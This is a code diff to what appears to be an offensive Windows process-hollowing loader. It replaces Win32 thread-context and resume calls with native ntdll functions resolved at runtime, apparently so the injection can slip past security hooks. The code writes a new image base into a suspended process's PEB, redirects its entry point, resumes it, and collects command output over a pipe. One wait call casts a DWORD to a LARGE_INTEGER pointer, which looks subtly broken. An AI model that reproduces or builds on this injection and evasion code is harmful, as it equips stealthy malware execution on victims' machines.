@@ -8,7 +8,10 @@ _NtReadVirtualMemory myNtRead = (_NtReadVirtualMemory)GetProcAddress(GetModuleHa
 _NtProtectVirtualMemory myNtProtec = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
 _NtAllocateVirtualMemory myNtAlloc = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
 _NtCreateThreadEx myNtThread = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
-
+_NtResumeThread myNtResumeThread = (_NtResumeThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtResumeThread");
+_NtWaitForSingleObject myNtWaitForSingleObject = (_NtWaitForSingleObject)GetProcAddress(GetModuleHandleA("ntdll"), "NtWaitForSingleObject");
+_NtGetContextThread myNtGetContextThread = (_NtGetContextThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtGetContextThread");
+_NtSetContextThread myNtSetContextThread = (_NtSetContextThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetContextThread");
 
 bool readPipe(HANDLE hPipe, PVOID* data, PDWORD dataLen)
 {
@@ -961,14 +964,14 @@ int main(int argc, char** argv)
 	CONTEXT CTX = {};
 	CTX.ContextFlags = CONTEXT_FULL;
 
-	BOOL bGetContext = GetThreadContext(pi->hThread, &CTX);
-	if (!bGetContext)
+	NTSTATUS status = myNtGetContextThread(pi->hThread, &CTX);
+	if (status != 0)
 	{
 		_dbg("[-] An error is occured when trying to get the thread context.\n");
 		return FALSE;
 	}
 
-	NTSTATUS status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &myPE->ntHeader->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
+	status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &myPE->ntHeader->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
 	if (status != 0)
 	{
 		_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
@@ -977,17 +980,18 @@ int main(int argc, char** argv)
 
 	CTX.Rcx = (DWORD64)allocAddrOnTarget + myPE->ntHeader->OptionalHeader.AddressOfEntryPoint;
 
-	BOOL bSetContext = SetThreadContext(pi->hThread, &CTX);
-	if (!bSetContext)
+	status = myNtSetContextThread(pi->hThread, &CTX);
+	if (status != 0)
 	{
 		_dbg("[-] An error is occured when trying to set the thread context.\n");
 		return FALSE;
 	}
 
-	ResumeThread(pi->hThread);
+	status = myNtResumeThread(pi->hThread, nullptr);
 	PVOID commandOutput = nullptr;
 	DWORD bytesSize = 0;
-	while (WaitForSingleObject(pi->hThread, 100) != WAIT_OBJECT_0) {
+	DWORD timeout = 100;
+	while (myNtWaitForSingleObject(pi->hThread, FALSE,PLARGE_INTEGER(&timeout)) != WAIT_OBJECT_0) {
 		readPipe(hStdOut, &commandOutput, &bytesSize);
 		if (bytesSize > 0)
 		{
